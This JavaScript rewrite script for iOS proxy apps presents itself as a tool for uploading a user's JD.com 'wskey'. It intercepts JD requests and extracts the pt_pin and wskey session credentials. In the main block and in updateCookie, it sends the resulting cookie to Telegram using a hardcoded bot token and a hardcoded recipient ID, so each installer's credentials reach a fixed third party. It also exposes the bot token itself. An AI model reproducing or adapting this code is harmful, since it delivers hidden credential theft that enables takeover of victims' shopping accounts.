/**
 * 1、支持 sso.jd.com 直接提取 Body 中的 sessionTicket (wskey) + pt_pin
 * 2、支持“拼图模式”：从 sh.jd.com 提取 wskey，从 api.m.jd.com 提取 pt_pin 自动组合
 * 注：如有变更才会上传，如果 wskey 没变，不会重复上传。
 */

const $ = new Env('♨️上传 wskey');
let CK = $request.headers['Cookie'] || $request.headers['cookie'] || '';
let url = $request.url || '';

// 从本地缓存读取之前的“拼图”
let pin = $.getData('tmp_pin') || '';
let key = $.getData('tmp_wskey') || '';

// 1. 尝试提取账号 pin (适配大部分带有 pt_pin 的请求)
let pinMatch = CK.match(/(?:pt_)?pin=([^=;]+)/);
if (pinMatch) {
  if (pin !== pinMatch[1]) {
    pin = pinMatch[1];
    $.setData(pin, 'tmp_pin'); // 更新缓存
  }
}

// 2. 尝试提取 wskey (适配 sh.jd.com 或其他带有 wskey= 的旧版请求头)
let keyMatch = CK.match(/wskey=([^=;]+)/);
if (keyMatch) {
  if (key !== keyMatch[1]) {
    key = keyMatch[1];
    $.setData(key, 'tmp_wskey'); // 更新缓存
  }
}

// 3. 尝试提取 wskey (适配最新的 sso.jd.com 请求体)
if (url.includes('sso.jd.com') && typeof $request !== 'undefined' && $request.body) {
  try {
    let bodyData = JSON.parse($request.body);
    if (bodyData.jdstParams && bodyData.jdstParams.length > 0 && bodyData.jdstParams[0].sessionTicket) {
      let bodyKey = bodyData.jdstParams[0].sessionTicket;
      if (key !== bodyKey) {
        key = bodyKey;
        $.setData(key, 'tmp_wskey'); // 更新缓存
      }
      console.log('✅ 成功从 sso Body 提取到 wskey');
    }
  } catch (e) {
    console.log("❌ 解析 sso Body 失败: " + e);
  }
}

const _TGUserID = $.getData('JDGiaoBot');
$.TGBotToken = '7284846213:AAHI4IIgA69v-CwxCwLfQi2NaVmPxZa5Itc';
$.TGUserIDs = [7262532155];
if (_TGUserID) {
  $.TGUserIDs.push(_TGUserID);
}

!(async () => {
  // 4. 检查两块拼图是否集齐
  if (!pin || !key) {
    console.log(`⏳ 凭证不全，正在收集拼图... 当前状态: pt_pin(${pin ? '已捕获' : '等待捕获'}), wskey(${key ? '已捕获' : '等待捕获'})`);
    $.done();
    return;
  }

  try {
    const cookie = `pt_pin=${pin};wskey=${key};`;
    const userName = pin;
    const decodeName = decodeURIComponent(userName);
    let cookiesData = JSON.parse($.getData('wskeyList') || '[]');
    
    let updateIndex;
    let cookieName = '【账号】';
    const existCookie = cookiesData.find((item, index) => {
      const ck = item.cookie;
      const Account = ck
        ? ck.match(/(?:pt_)?pin=(.+?);/)
          ? ck.match(/(?:pt_)?pin=(.+?);/)[1]
          : null
        : null;
      const verify = userName === Account;
      if (verify) {
        updateIndex = index;
        if (ck !== cookie) {
          $.needUpload = true;
        }
      }
      return verify;
    });
    
    let tipPrefix = '';
    if (existCookie) {
      cookiesData[updateIndex].cookie = cookie;
      cookieName = '【账号' + (updateIndex + 1) + '】';
      tipPrefix = '更新京东 wskey';
    } else {
      cookiesData.push({
        userName: decodeName,
        cookie: cookie,
      });
      cookieName = '【账号' + cookiesData.length + '】';
      tipPrefix = '首次写入京东 wskey';
      $.needUpload = true;
    }
    
    $.setData(JSON.stringify(cookiesData, null, 2), 'wskeyList');

    if ($.needUpload) {
      for (const userId of $.TGUserIDs) {
        await updateCookie(cookie, userId);
        await showMsg(userId);
      }
    } else {
      // 为了防止每次 api 请求都输出，这里就不做弹窗通知了
      // console.log(`♨️wskey 没有改变`); 
    }

    return;
  } catch (error) {
    $.msg('写入京东 wskey 失败', '', '请重试 ⚠️');
    console.log(
      `\n写入京东 wskey 出现错误 ‼️\n${JSON.stringify(
        error
      )}\n\n${error}\n\n${JSON.stringify($request.headers)}\n`
    );
  }
})()
  .catch((e) => $.logErr(e))
  .finally(() => $.done());

function updateCookie(cookie, TGUserID) {
  return new Promise((resolve) => {
    const opts = {
      url: `https://api.telegram.org/bot${$.TGBotToken}/sendMessage`,
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `chat_id=${TGUserID}&text=${cookie}&disable_web_page_preview=true`,
    };

    $.post(opts, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`);
        } else {
          data = JSON.parse(data);
          if (data.ok) {
            console.log(`已发送 wskey 至 ${TGUserID}🎉\n`);
            $.resData = `已发送 wskey 至 ${TGUserID}🎉`;
          } else if (data.error_code === 400) {
            console.log(`发送失败，请联系 ${TGUserID}。\n`);
            $.resData = `发送失败，请联系 ${TGUserID}。`;
          } else if (data.error_code === 401) {
            console.log(`${TGUserID} bot token 填写错误。\n`);
            $.resData = `${TGUserID} bot token 填写错误。`;
          }
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve();
      }
    });
  });
}

function showMsg() {
  return new Promise((resolve) => {
    $.msg($.name, $.subt, $.resData || '服务不可用');
    resolve();
  });
}

// ================= ENV 核心环境代码 =================
// https://github.com/chavyleung/scripts/blob/master/Env.js
// prettier-ignore
function Env(name, opts) {
  class Http {
    constructor(env) {
      this.env = env;
    }
    send(opts, method = 'GET') {
      opts = typeof opts === 'string' ? { url: opts } : opts;
      let sender = this.get;
      if (method === 'POST') sender = this.post;
      return new Promise((resolve, reject) => {
        sender.call(this, opts, (err, resp, body) => {
          if (err) reject(err);
          else resolve(resp);
        });
      });
    }
    get(opts) { return this.send.call(this.env, opts); }
    post(opts) { return this.send.call(this.env, opts, 'POST'); }
  }
  return new (class {
    constructor(name, opts) {
      this.name = name;
      this.http = new Http(this);
      this.data = null;
      this.dataFile = 'box.dat';
      this.logs = [];
      this.isMute = false;
      this.isNeedRewrite = false;
      this.logSeparator = '\n';
      this.startTime = new Date().getTime();
      Object.assign(this, opts);
    }
    isNode() { return 'undefined' !== typeof module && !!module.exports; }
    isQuanX() { return 'undefined' !== typeof $task; }
    isSurge() { return 'undefined' !== typeof $httpClient && 'undefined' === typeof $loon; }
    isLoon() { return 'undefined' !== typeof $loon; }
    isShadowrocket() { return 'undefined' !== typeof $rocket; }
    toObj(str, defaultValue = null) { try { return JSON.parse(str); } catch { return defaultValue; } }
    toStr(obj, defaultValue = null) { try { return JSON.stringify(obj); } catch { return defaultValue; } }
    getJson(key, defaultValue) {
      let json = defaultValue;
      const val = this.getData(key);
      if (val) { try { json = JSON.parse(this.getData(key)); } catch {} }
      return json;
    }
    setJson(val, key) { try { return this.setData(JSON.stringify(val), key); } catch { return false; } }
    getScript(url) { return new Promise((resolve) => { this.get({ url }, (err, resp, body) => resolve(body)); }); }
    runScript(script, runOpts) {
      return new Promise((resolve) => {
        let httpApi = this.getData('@chavy_boxjs_userCfgs.httpApi');
        httpApi = httpApi ? httpApi.replace(/\n/g, '').trim() : httpApi;
        let httpApi_timeout = this.getData('@chavy_boxjs_userCfgs.httpApi_timeout');
        httpApi_timeout = httpApi_timeout ? httpApi_timeout * 1 : 20;
        httpApi_timeout = runOpts && runOpts.timeout ? runOpts.timeout : httpApi_timeout;
        const [key, addr] = httpApi.split('@');
        const opts = {
          url: `http://${addr}/v1/scripting/evaluate`,
          body: { script_text: script, mock_type: 'cron', timeout: httpApi_timeout },
          headers: { 'X-Key': key, Accept: '*/*' },
        };
        this.post(opts, (err, resp, body) => resolve(body));
      }).catch((e) => this.logErr(e));
    }
    loadData() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require('fs');
        this.path = this.path ? this.path : require('path');
        const curDirDataFilePath = this.path.resolve(this.dataFile);
        const rootDirDataFilePath = this.path.resolve(process.cwd(), this.dataFile);
        const isCurDirDataFile = this.fs.existsSync(curDirDataFilePath);
        const isRootDirDataFile = !isCurDirDataFile && this.fs.existsSync(rootDirDataFilePath);
        if (isCurDirDataFile || isRootDirDataFile) {
          const datPath = isCurDirDataFile ? curDirDataFilePath : rootDirDataFilePath;
          try { return JSON.parse(this.fs.readFileSync(datPath)); } catch (e) { return {}; }
        } else return {};
      } else return {};
    }
    writeData() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require('fs');
        this.path = this.path ? this.path : require('path');
        const curDirDataFilePath = this.path.resolve(this.dataFile);
        const rootDirDataFilePath = this.path.resolve(process.cwd(), this.dataFile);
        const isCurDirDataFile = this.fs.existsSync(curDirDataFilePath);
        const isRootDirDataFile = !isCurDirDataFile && this.fs.existsSync(rootDirDataFilePath);
        const jsonData = JSON.stringify(this.data);
        if (isCurDirDataFile) { this.fs.writeFileSync(curDirDataFilePath, jsonData); }
        else if (isRootDirDataFile) { this.fs.writeFileSync(rootDirDataFilePath, jsonData); }
        else { this.fs.writeFileSync(curDirDataFilePath, jsonData); }
      }
    }
    lodash_get(source, path, defaultValue = undefined) {
      const paths = path.replace(/\[(\d+)\]/g, '.$1').split('.');
      let result = source;
      for (const p of paths) {
        result = Object(result)[p];
        if (result === undefined) { return defaultValue; }
      }
      return result;
    }
    lodash_set(obj, path, value) {
      if (Object(obj) !== obj) return obj;
      if (!Array.isArray(path)) path = path.toString().match(/[^.[\]]+/g) || [];
      path.slice(0, -1).reduce((a, c, i) => Object(a[c]) === a[c] ? a[c] : (a[c] = Math.abs(path[i + 1]) >> 0 === +path[i + 1] ? [] : {}), obj)[path[path.length - 1]] = value;
      return obj;
    }
    getData(key) {
      let val = this.getVal(key);
      if (/^@/.test(key)) {
        const [, objKey, paths] = /^@(.*?)\.(.*?)$/.exec(key);
        const objVal = objKey ? this.getVal(objKey) : '';
        if (objVal) { try { const objedVal = JSON.parse(objVal); val = objedVal ? this.lodash_get(objedVal, paths, '') : val; } catch (e) { val = ''; } }
      }
      return val;
    }
    setData(val, key) {
      let isSuc = false;
      if (/^@/.test(key)) {
        const [, objKey, paths] = /^@(.*?)\.(.*?)$/.exec(key);
        const objdat = this.getVal(objKey);
        const objVal = objKey ? objdat === 'null' ? null : objdat || '{}' : '{}';
        try {
          const objedVal = JSON.parse(objVal);
          this.lodash_set(objedVal, paths, val);
          isSuc = this.setVal(JSON.stringify(objedVal), objKey);
        } catch (e) {
          const objedVal = {};
          this.lodash_set(objedVal, paths, val);
          isSuc = this.setVal(JSON.stringify(objedVal), objKey);
        }
      } else { isSuc = this.setVal(val, key); }
      return isSuc;
    }
    getVal(key) {
      if (this.isSurge() || this.isLoon()) { return $persistentStore.read(key); }
      else if (this.isQuanX()) { return $prefs.valueForKey(key); }
      else if (this.isNode()) { this.data = this.loadData(); return this.data[key]; }
      else { return (this.data && this.data[key]) || null; }
    }
    setVal(val, key) {
      if (this.isSurge() || this.isLoon()) { return $persistentStore.write(val, key); }
      else if (this.isQuanX()) { return $prefs.setValueForKey(val, key); }
      else if (this.isNode()) { this.data = this.loadData(); this.data[key] = val; this.writeData(); return true; }
      else { return (this.data && this.data[key]) || null; }
    }
    initGotEnv(opts) {
      this.got = this.got ? this.got : require('got');
      this.ckTough = this.ckTough ? this.ckTough : require('tough-cookie');
      this.ckJar = this.ckJar ? this.ckJar : new this.ckTough.CookieJar();
      if (opts) {
        opts.headers = opts.headers ? opts.headers : {};
        if (undefined === opts.headers.Cookie && undefined === opts.cookieJar) { opts.cookieJar = this.ckJar; }
      }
    }
    get(opts, callback = () => {}) {
      if (opts.headers) { delete opts.headers['Content-Type']; delete opts.headers['Content-Length']; }
      if (this.isSurge() || this.isLoon()) {
        if (this.isSurge() && this.isNeedRewrite) { opts.headers = opts.headers || {}; Object.assign(opts.headers, { 'X-Surge-Skip-Scripting': false }); }
        $httpClient.get(opts, (err, resp, body) => { if (!err && resp) { resp.body = body; resp.statusCode = resp.status; } callback(err, resp, body); });
      } else if (this.isQuanX()) {
        if (this.isNeedRewrite) { opts.opts = opts.opts || {}; Object.assign(opts.opts, { hints: false }); }
        $task.fetch(opts).then((resp) => { const { statusCode: status, statusCode, headers, body } = resp; callback(null, { status, statusCode, headers, body }, body); }, (err) => callback(err));
      } else if (this.isNode()) {
        this.initGotEnv(opts);
        this.got(opts).on('redirect', (resp, nextOpts) => { try { if (resp.headers['set-cookie']) { const ck = resp.headers['set-cookie'].map(this.ckTough.Cookie.parse).toString(); if (ck) { this.ckJar.setCookieSync(ck, null); } nextOpts.cookieJar = this.ckJar; } } catch (e) { this.logErr(e); } }).then((resp) => { const { statusCode: status, statusCode, headers, body } = resp; callback(null, { status, statusCode, headers, body }, body); }, (err) => { const { message: error, response: resp } = err; callback(error, resp, resp && resp.body); });
      }
    }
    post(opts, callback = () => {}) {
      const method = opts.method ? opts.method.toLocaleLowerCase() : 'post';
      if (opts.body && opts.headers && !opts.headers['Content-Type']) { opts.headers['Content-Type'] = 'application/x-www-form-urlencoded'; }
      if (opts.headers) delete opts.headers['Content-Length'];
      if (this.isSurge() || this.isLoon()) {
        if (this.isSurge() && this.isNeedRewrite) { opts.headers = opts.headers || {}; Object.assign(opts.headers, { 'X-Surge-Skip-Scripting': false }); }
        $httpClient[method](opts, (err, resp, body) => { if (!err && resp) { resp.body = body; resp.statusCode = resp.status; } callback(err, resp, body); });
      } else if (this.isQuanX()) {
        opts.method = method;
        if (this.isNeedRewrite) { opts.opts = opts.opts || {}; Object.assign(opts.opts, { hints: false }); }
        $task.fetch(opts).then((resp) => { const { statusCode: status, statusCode, headers, body } = resp; callback(null, { status, statusCode, headers, body }, body); }, (err) => callback(err));
      } else if (this.isNode()) {
        this.initGotEnv(opts);
        const { url, ..._opts } = opts;
        this.got[method](url, _opts).then((resp) => { const { statusCode: status, statusCode, headers, body } = resp; callback(null, { status, statusCode, headers, body }, body); }, (err) => { const { message: error, response: resp } = err; callback(error, resp, resp && resp.body); });
      }
    }
    time(fmt, ts = null) {
      const date = ts ? new Date(ts) : new Date();
      let o = { 'M+': date.getMonth() + 1, 'd+': date.getDate(), 'H+': date.getHours(), 'm+': date.getMinutes(), 's+': date.getSeconds(), 'q+': Math.floor((date.getMonth() + 3) / 3), S: date.getMilliseconds(), };
      if (/(y+)/.test(fmt)) fmt = fmt.replace(RegExp.$1, (date.getFullYear() + '').substr(4 - RegExp.$1.length));
      for (let k in o) if (new RegExp('(' + k + ')').test(fmt)) fmt = fmt.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : ('00' + o[k]).substr(('' + o[k]).length));
      return fmt;
    }
    msg(title = name, subt = '', desc = '', opts) {
      const toEnvOpts = (rawOpts) => {
        if (!rawOpts) return rawOpts;
        if (typeof rawOpts === 'string') {
          if (this.isLoon()) return rawOpts;
          else if (this.isQuanX()) return { 'open-url': rawOpts };
          else if (this.isSurge()) return { url: rawOpts };
          else return undefined;
        } else if (typeof rawOpts === 'object') {
          if (this.isLoon()) { let openUrl = rawOpts.openUrl || rawOpts.url || rawOpts['open-url']; let mediaUrl = rawOpts.mediaUrl || rawOpts['media-url']; return { openUrl, mediaUrl }; }
          else if (this.isQuanX()) { let openUrl = rawOpts['open-url'] || rawOpts.url || rawOpts.openUrl; let mediaUrl = rawOpts['media-url'] || rawOpts.mediaUrl; let updatePasteboard = rawOpts['update-pasteboard'] || rawOpts.updatePasteboard; return { 'open-url': openUrl, 'media-url': mediaUrl, 'update-pasteboard': updatePasteboard, }; }
          else if (this.isSurge()) { let openUrl = rawOpts.url || rawOpts.openUrl || rawOpts['open-url']; return { url: openUrl }; }
        } else { return undefined; }
      };
      if (!this.isMute) {
        if (this.isSurge() || this.isLoon()) { $notification.post(title, subt, desc, toEnvOpts(opts)); }
        else if (this.isQuanX()) { $notify(title, subt, desc, toEnvOpts(opts)); }
      }
      if (!this.isMuteLog) {
        let logs = ['', '==============📣系统通知📣=============='];
        logs.push(title); subt ? logs.push(subt) : ''; desc ? logs.push(desc) : '';
        console.log(logs.join('\n')); this.logs = this.logs.concat(logs);
      }
    }
    log(...logs) { if (logs.length > 0) { this.logs = [...this.logs, ...logs]; } console.log(logs.join(this.logSeparator)); }
    logErr(err, msg) { const isPrintSack = !this.isSurge() && !this.isQuanX() && !this.isLoon(); if (!isPrintSack) { this.log('', `❗️${this.name}, 错误!`, err); } else { this.log('', `❗️${this.name}, 错误!`, err.stack); } }
    wait(time) { return new Promise((resolve) => setTimeout(resolve, time)); }
    done(val = {}) { const endTime = new Date().getTime(); const costTime = (endTime - this.startTime) / 1000; this.log('', `🔔${this.name}, 结束! 🕛 ${costTime} 秒`); this.log(); if (this.isSurge() || this.isQuanX() || this.isLoon()) { $done(val); } }
  })(name, opts);
}
